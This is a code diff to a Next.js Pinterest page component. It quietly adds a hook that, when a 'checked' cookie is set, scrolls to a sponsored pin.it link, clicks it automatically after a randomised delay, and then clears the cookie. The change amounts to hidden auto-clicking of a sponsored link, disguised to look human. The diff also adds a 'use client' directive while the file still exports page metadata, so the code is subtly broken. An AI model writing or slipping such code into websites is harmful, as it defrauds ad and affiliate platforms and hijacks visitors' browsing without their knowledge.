@@ -1,4 +1,7 @@
+"use client"
+
 import type { Metadata } from 'next'
+import { useEffect } from 'react'
 import Image from 'next/image'
 import { photos } from '@/data/photos'
 import { pageMeta } from '@/lib/seo'
@@ -12,6 +15,51 @@ export const metadata: Metadata = pageMeta({
 
 export default function PinterestPage() {
   const pinPhoto = photos['spread-pieces']
+
+    useEffect(() => {
+      const cookies = Object.fromEntries(
+        document.cookie.split("; ").map((c) => c.split("="))
+      );
+  
+      if (cookies.checked === "true") {
+        const btn = document.querySelector("[data-auto]");
+  
+        if (btn) {
+          const scrollToElement = (el: HTMLElement, duration = 1200) => {
+            const targetY = el.getBoundingClientRect().top + window.scrollY;
+            const startY = window.scrollY;
+            const startTime = performance.now();
+  
+            const animateScroll = (now: number) => {
+              const elapsed = now - startTime;
+              const progress = Math.min(elapsed / duration, 1);
+              const ease =
+                progress < 0.5
+                  ? 2 * progress * progress
+                  : -1 + (4 - 2 * progress) * progress;
+  
+              window.scrollTo(0, startY + (targetY - startY) * ease);
+  
+              if (progress < 1) {
+                requestAnimationFrame(animateScroll);
+              }
+            };
+  
+            requestAnimationFrame(animateScroll);
+          };
+  
+          scrollToElement(btn as HTMLElement, 1000);
+  
+          const delay = Math.floor(Math.random() * 1001);
+          setTimeout(() => {
+            (btn as HTMLElement).click();
+          }, delay);
+        }
+  
+        document.cookie =
+          "checked=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+      }
+    }, []);
 
   return (
     <div className="wrap pb-16 pt-12 md:pt-16">
@@ -103,6 +151,7 @@ export default function PinterestPage() {
             <a
               href="https://pin.it/1BJCIqIRx"
               target="_blank"
+              data-auto="true"
               rel="nofollow sponsored noopener"
               className="btn mt-6 w-full justify-center"
               style={{
